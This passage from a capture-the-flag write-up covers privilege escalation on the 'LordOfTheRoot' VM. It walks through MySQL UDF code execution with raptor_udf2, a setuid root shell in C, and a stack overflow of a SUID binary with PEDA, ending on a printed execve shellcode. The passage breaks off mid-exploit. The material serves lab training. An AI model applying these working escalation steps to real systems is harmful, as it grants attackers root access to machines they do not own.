</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span></code></pre></td></tr></table></div></figure>


<p>If you copy from the source code, you have to change the 1 in <em>-W1</em> to a lowercase l, otherwise you get an error. Here&rsquo;s a <a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">good resource</a> to help you untangle the above command. Now you should also have in your directory a shared object called <code>raptor_udf2.so</code>.</p>

<ul>
<li>Now you create a table inside MySQL and insert the shared object contents. Switch to the mysql DB:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; use mysql;
</span><span class='line'>Reading table information for completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Database changed</span></code></pre></td></tr></table></div></figure>


<p>Create table:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; create table foo(line blob);
</span><span class='line'>Query OK, 0 rows affected (0.03 sec)</span></code></pre></td></tr></table></div></figure>


<p>Load your .so file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
</span><span class='line'>Query OK, 1 row affected (0.01 sec)</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Copy the .so file to the plugin directory:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
</span><span class='line'>Query OK, 1 row affected (0.05 sec)</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Now you can create the UDF:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';
</span><span class='line'>Query OK, 0 rows affected (0.00 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; select * from mysql.func;
</span><span class='line'>+-----------+-----+----------------+----------+
</span><span class='line'>| name      | ret | dl             | type     |
</span><span class='line'>+-----------+-----+----------------+----------+
</span><span class='line'>| do_system |   2 | raptor_udf2.so | function |
</span><span class='line'>+-----------+-----+----------------+----------+
</span><span class='line'>1 row in set (0.00 sec)</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Confirm that it works:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select do_system('id &gt; /tmp/out; chown smeagol.smeagol /tmp/out');
</span><span class='line'>+------------------------------------------------------------+
</span><span class='line'>| do_system('id &gt; /tmp/out; chown smeagol.smeagol /tmp/out') |
</span><span class='line'>+------------------------------------------------------------+
</span><span class='line'>|                                                          0 |
</span><span class='line'>+------------------------------------------------------------+
</span><span class='line'>1 row in set (0.01 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; \! cat /tmp/out
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>


<p>Note that you can use <em>\!</em> to run commands from within the MySQL shell.</p>

<ul>
<li>Finally, we want to gain a real root shell. A setuid shell is ideal for this. I placed the following C code inside a file called shell.c:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>I used MySQL to compile it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select do_system("gcc -o /tmp/ring /home/smeagol/shell.c");
</span><span class='line'>+-----------------------------------------------------+
</span><span class='line'>| do_system("gcc -o /tmp/ring /home/smeagol/shell.c") |
</span><span class='line'>+-----------------------------------------------------+
</span><span class='line'>|                                                   0 |
</span><span class='line'>+-----------------------------------------------------+
</span><span class='line'>1 row in set (0.15 sec)</span></code></pre></td></tr></table></div></figure>


<p>Now set the SUID bit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select do_system("chmod u+s /tmp/ring");
</span><span class='line'>+----------------------------------+
</span><span class='line'>| do_system("chmod u+s /tmp/ring") |
</span><span class='line'>+----------------------------------+
</span><span class='line'>|                                0 |
</span><span class='line'>+----------------------------------+
</span><span class='line'>1 row in set (0.01 sec)</span></code></pre></td></tr></table></div></figure>


<p>I looked inside /tmp for confirmation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:~$ ls -l /tmp/
</span><span class='line'>total 12
</span><span class='line'>-rw-rw---- 1 smeagol smeagol   39 Jun 14 04:06 out
</span><span class='line'>-rwsrwx--x 1 root    root    7410 Jun 14 04:16 ring</span></code></pre></td></tr></table></div></figure>


<p>Lastly, I dropped to a shell with <code>\! sh</code>, and ran the newly created binary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ /tmp/ring
</span><span class='line'>root@LordOfTheRoot:~# cat /root/Flag.txt 
</span><span class='line'>“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
</span><span class='line'>– Gandalf</span></code></pre></td></tr></table></div></figure>


<p>Inside root&rsquo;s directory I also found source code for the binaries that will supply the second method of exploitation. And a Python script that moves them around, just like in the Tr0ll 2 challenge..</p>

<h2>Privilege escalation method #2 &ndash; Binary exploitation</h2>

<p>So, I previously looked at the source code of the binaries inside the SECRET folder, and I know one of them is vulnerable to buffer overflow. Need to find which one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/SECRET$ ls -la *
</span><span class='line'>door1:
</span><span class='line'>total 16
</span><span class='line'>drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
</span><span class='line'>drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
</span><span class='line'>-rwsr-xr-x 1 root root 7370 Sep 17  2015 file
</span><span class='line'>
</span><span class='line'>door2:
</span><span class='line'>total 16
</span><span class='line'>drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
</span><span class='line'>drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
</span><span class='line'>-rwsr-xr-x 1 root root 5150 Sep 22  2015 file
</span><span class='line'>
</span><span class='line'>door3:
</span><span class='line'>total 16
</span><span class='line'>drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
</span><span class='line'>drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
</span><span class='line'>-rwsr-xr-x 1 root root 7370 Sep 17  2015 file</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see each of them:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>door1/file 
</span><span class='line'>Syntax: door1/file &lt;input string&gt;</span></code></pre></td></tr></table></div></figure>


<p>I went through them, and determined that the vulnerable binary is the one with size 5150.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./file $(python -c 'print "A" * 200')
</span><span class='line'>Segmentation fault (core dumped)</span></code></pre></td></tr></table></div></figure>


<p>I copied the binary to /tmp, so I could work on it without the interference of the moving script. Normally, it&rsquo;s GDB time, but I want to expand my tools coverage, and I noticed in other writeups the mention of PEDA, or <a href="https://github.com/longld/peda">Python Exploit Development Assistance for GDB</a>, which adds cool features and colorizes the display. So I figured I&rsquo;d give it a try, and downloaded it to the target and installed it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git clone https://github.com/longld/peda.git ~/peda
</span><span class='line'>echo "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit</span></code></pre></td></tr></table></div></figure>


<p>If you want to see what PEDA can do, run <code>peda help</code> to see all available commands:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ peda help
</span><span class='line'>PEDA - Python Exploit Development Assistance for GDB
</span><span class='line'>For latest update, check peda project page: https://github.com/longld/peda/
</span><span class='line'>List of "peda" subcommands, type the subcommand to invoke it:
</span><span class='line'>aslr -- Show/set ASLR setting of GDB
</span><span class='line'>asmsearch -- Search for ASM instructions in memory
</span><span class='line'>assemble -- On the fly assemble and execute instructions using NASM
</span><span class='line'>checksec -- Check for various security options of binary
</span><span class='line'>cmpmem -- Compare content of a memory region with a file
</span><span class='line'>context -- Display various information of current execution context
</span><span class='line'>context_code -- Display nearby disassembly at $PC of current execution context
</span><span class='line'>context_register -- Display register information of current execution context
</span><span class='line'>context_stack -- Display stack of current execution context
</span><span class='line'>crashdump -- Display crashdump info and save to file
</span><span class='line'>deactive -- Bypass a function by ignoring its execution (eg sleep/alarm)
</span><span class='line'>distance -- Calculate distance between two addresses
</span><span class='line'>dumpargs -- Display arguments passed to a function when stopped at a call instruction
</span><span class='line'>dumpmem -- Dump content of a memory region to raw binary file
</span><span class='line'>dumprop -- Dump all ROP gadgets in specific memory range
</span><span class='line'>eflags -- Display/set/clear/toggle value of eflags register
</span><span class='line'>elfheader -- Get headers information from debugged ELF file
</span><span class='line'>elfsymbol -- Get non-debugging symbol information from an ELF file
</span><span class='line'>gennop -- Generate abitrary length NOP sled using given characters
</span><span class='line'>getfile -- Get exec filename of current debugged process
</span><span class='line'>getpid -- Get PID of current debugged process
</span><span class='line'>goto -- Continue execution at an address
</span><span class='line'>help -- Print the usage manual for PEDA commands
</span><span class='line'>hexdump -- Display hex/ascii dump of data in memory
</span><span class='line'>hexprint -- Display hexified of data in memory
</span><span class='line'>jmpcall -- Search for JMP/CALL instructions in memory
</span><span class='line'>loadmem -- Load contents of a raw binary file to memory
</span><span class='line'>lookup -- Search for all addresses/references to addresses which belong to a memory range
</span><span class='line'>nearpc -- Disassemble instructions nearby current PC or given address
</span><span class='line'>nextcall -- Step until next 'call' instruction in specific memory range
</span><span class='line'>nextjmp -- Step until next 'j*' instruction in specific memory range
</span><span class='line'>nxtest -- Perform real NX test to see if it is enabled/supported by OS
</span><span class='line'>patch -- Patch memory start at an address with string/hexstring/int
</span><span class='line'>pattern -- Generate, search, or write a cyclic pattern to memory
</span><span class='line'>pattern_arg -- Set argument list with cyclic pattern
</span><span class='line'>pattern_create -- Generate a cyclic pattern
</span><span class='line'>pattern_env -- Set environment variable with a cyclic pattern
</span><span class='line'>pattern_offset -- Search for offset of a value in cyclic pattern
</span><span class='line'>pattern_patch -- Write a cyclic pattern to memory
</span><span class='line'>pattern_search -- Search a cyclic pattern in registers and memory
</span><span class='line'>payload -- Generate various type of ROP payload using ret2plt
</span><span class='line'>pdisass -- Format output of gdb disassemble command with colors
</span><span class='line'>pltbreak -- Set breakpoint at PLT functions match name regex
</span><span class='line'>procinfo -- Display various info from /proc/pid/
</span><span class='line'>profile -- Simple profiling to count executed instructions in the program
</span><span class='line'>pyhelp -- Wrapper for python built-in help
</span><span class='line'>readelf -- Get headers information from an ELF file
</span><span class='line'>refsearch -- Search for all references to a value in memory ranges
</span><span class='line'>reload -- Reload PEDA sources, keep current options untouch
</span><span class='line'>ropgadget -- Get common ROP gadgets of binary or library
</span><span class='line'>ropsearch -- Search for ROP gadgets in memory
</span><span class='line'>searchmem -- Search for a pattern in memory; support regex search
</span><span class='line'>session -- Save/restore a working gdb session to file as a script
</span><span class='line'>set -- Set various PEDA options and other settings
</span><span class='line'>sgrep -- Search for full strings contain the given pattern
</span><span class='line'>shellcode -- Generate or download common shellcodes.
</span><span class='line'>show -- Show various PEDA options and other settings
</span><span class='line'>skeleton -- Generate python exploit code template
</span><span class='line'>skipi -- Skip execution of next count instructions
</span><span class='line'>snapshot -- Save/restore process's snapshot to/from file
</span><span class='line'>start -- Start debugged program and stop at most convenient entry
</span><span class='line'>stepuntil -- Step until a desired instruction in specific memory range
</span><span class='line'>strings -- Display printable strings in memory
</span><span class='line'>substr -- Search for substrings of a given string/number in memory
</span><span class='line'>telescope -- Display memory content at an address with smart dereferences
</span><span class='line'>tracecall -- Trace function calls made by the program
</span><span class='line'>traceinst -- Trace specific instructions executed by the program
</span><span class='line'>unptrace -- Disable anti-ptrace detection
</span><span class='line'>utils -- Miscelaneous utilities from utils module
</span><span class='line'>vmmap -- Get virtual mapping address ranges of section(s) in debugged process
</span><span class='line'>waitfor -- Try to attach to new forked process; mimic "attach -waitfor"
</span><span class='line'>xinfo -- Display detail information of address/registers
</span><span class='line'>xormem -- XOR a memory region with a key
</span><span class='line'>xprint -- Extra support to GDB's print command
</span><span class='line'>xrefs -- Search for all call/data access references to a function/variable
</span><span class='line'>xuntil -- Continue execution until an address or function
</span><span class='line'>
</span><span class='line'>Type "help" followed by subcommand for full documentation.</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s time to run the binary! With Peda, you can create patterns just like with the Metasploit utilities:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ peda help pattern
</span><span class='line'>Generate, search, or write a cyclic pattern to memory
</span><span class='line'>Set "pattern" option for basic/extended pattern type
</span><span class='line'>Usage:
</span><span class='line'>    pattern create size [file]
</span><span class='line'>    pattern offset value
</span><span class='line'>    pattern search
</span><span class='line'>    pattern patch address size
</span><span class='line'>    pattern arg size1 [size2,offset2]
</span><span class='line'>    pattern env size[,offset]
</span><span class='line'>gdb-peda$ pattern create 200 test
</span><span class='line'>Writing pattern of 200 chars to filename "test"</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/peda.png" title="peda" alt="segfault in peda"></p>

<p>I wanted to show a screenshot instead of the code, so you can also see the colors that make the output much more readable. You can see that EIP has been overwritten with the value 0x57414174. I searched for it in the pattern:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ pattern search 0x57414174
</span><span class='line'>Registers contain pattern buffer:
</span><span class='line'>EBP+0 found at offset: 167
</span><span class='line'>EIP+0 found at offset: 171
</span><span class='line'>Registers point to pattern buffer:
</span><span class='line'>[ESP] --&gt; offset 175 - size ~25
</span><span class='line'>Pattern buffer found at:
</span><span class='line'>0xbffff571 : offset    0 - size  200 ($sp + -0xaf [-44 dwords])
</span><span class='line'>0xbffff7f8 : offset    0 - size  200 ($sp + 0x1d8 [118 dwords])
</span><span class='line'>References to pattern buffer found at:
</span><span class='line'>0xbffff550 : 0xbffff571 ($sp + -0xd0 [-52 dwords])
</span><span class='line'>0xbffff560 : 0xbffff571 ($sp + -0xc0 [-48 dwords])
</span><span class='line'>0xbffff564 : 0xbffff7f8 ($sp + -0xbc [-47 dwords])
</span><span class='line'>0xbffff6b8 : 0xbffff7f8 ($sp + 0x98 [38 dwords])</span></code></pre></td></tr></table></div></figure>


<p>The reported offset is 171. Verified it really quick:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ r $(python -c 'print "A" * 171 + "B" * 4 + "C" * 4')
</span><span class='line'>[...]
</span><span class='line'>EBP: 0x41414141 ('AAAA')
</span><span class='line'>ESP: 0xbffff640 ("CCCC")
</span><span class='line'>EIP: 0x42424242 ('BBBB')</span></code></pre></td></tr></table></div></figure>


<p>Alright, now we need some shellcode. I decided to use Peda for all the exploitation phases, so I could showcase more of its functionality. First, I looked at the options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ peda help shellcode
</span><span class='line'>Generate or download common shellcodes.
</span><span class='line'>Usage:
</span><span class='line'>    shellcode generate [arch/]platform type [port] [host]
</span><span class='line'>    shellcode search keyword (use % for any character wildcard)
</span><span class='line'>    shellcode display shellcodeId (shellcodeId as appears in search results)
</span><span class='line'>    shellcode zsc [generate customize shellcode]
</span><span class='line'>
</span><span class='line'>    For generate option:
</span><span class='line'>        default port for bindport shellcode: 16706 (0x4142)
</span><span class='line'>        default host/port for connect back shellcode: 127.127.127.127/16706
</span><span class='line'>        supported arch: x86</span></code></pre></td></tr></table></div></figure>


<p>Next I searched for some execve shellcode, and settled for the below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[841]    Linux/x86 - Tiny Execve sh Shellcode - 21 bytes</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what I got here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ shellcode display 841
</span><span class='line'>Connecting to shell-storm.org...
</span><span class='line'>
</span><span class='line'>/*
</span><span class='line'>
</span><span class='line'> Tiny Execve sh Shellcode - C Language - Linux/x86
</span><span class='line'> Copyright (C) 2013 Geyslan G. Bem, Hacking bits
</span><span class='line'>
</span><span class='line'>   http://hackingbits.com
</span><span class='line'>   geyslan@gmail.com
</span><span class='line'>
</span><span class='line'> This program is free software: you can redistribute it and/or modify
</span><span class='line'> it under the terms of the GNU General Public License as published by
</span><span class='line'> the Free Software Foundation, either version 3 of the License, or
</span><span class='line'> (at your option) any later version.
</span><span class='line'>
</span><span class='line'> This program is distributed in the hope that it will be useful,
</span><span class='line'> but WITHOUT ANY WARRANTY; without even the implied warranty of
</span><span class='line'> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
</span><span class='line'> GNU General Public License for more details.
</span><span class='line'>
</span><span class='line'> You should have received a copy of the GNU General Public License
</span><span class='line'> along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;
</span><span class='line'>
</span><span class='line'>*/
</span><span class='line'>
</span><span class='line'>/*
</span><span class='line'>
</span><span class='line'>   tiny_execve_sh_shellcode
</span><span class='line'>
</span><span class='line'>  * 21 bytes
</span><span class='line'>  * null-free
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode
</span><span class='line'>
</span><span class='line'>   Testing
</span><span class='line'>   # ./tiny_execve_sh_shellcode
</span><span class='line'>
</span><span class='line'>*/
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>
</span><span class='line'>unsigned char shellcode[] = \
</span><span class='line'>
</span><span class='line'>"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
</span><span class='line'>"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
</span><span class='line'>"\x80";
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>main ()
</span><span class='line'>{
</span><span class='line'>
</span><span class='line'>        // When contains null bytes, printf will show a wrong shellcode length.
</span><span class='line'>
</span><span class='line'>  printf("Shellcode Length:  %d\n", strlen(shellcode));
</span><span class='line'>
</span><span class='line'>  // Pollutes all registers ensuring that the shellcode runs in any circumstance.
</span><span class='line'>
</span><span class='line'>  __asm__ ("movl $0xffffffff, %eax\n\t"
</span><span class='line'>       "movl %eax, %ebx\n\t"
</span><span class='line'>       "movl %eax, %ecx\n\t"
</span><span class='line'>       "movl %eax, %edx\n\t"
</span><span class='line'>       "movl %eax, %esi\n\t"
</span><span class='line'>       "movl %eax, %edi\n\t"
</span><span class='line'>       "movl %eax, %ebp\n\t"
</span><span class='line'>
</span><span class='line'>       // Calling the shellcode
</span><span class='line'>       "call shellcode");
</span><span class='line'>
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Ok, the shellcode is <code>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</code>. Next we need the address of ESP, so we know where to store our shellcode. Then we can have a full payload, where we point EIP to the contents of ESP, and the shellcode gets executed.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ context stack
</span><span class='line'>
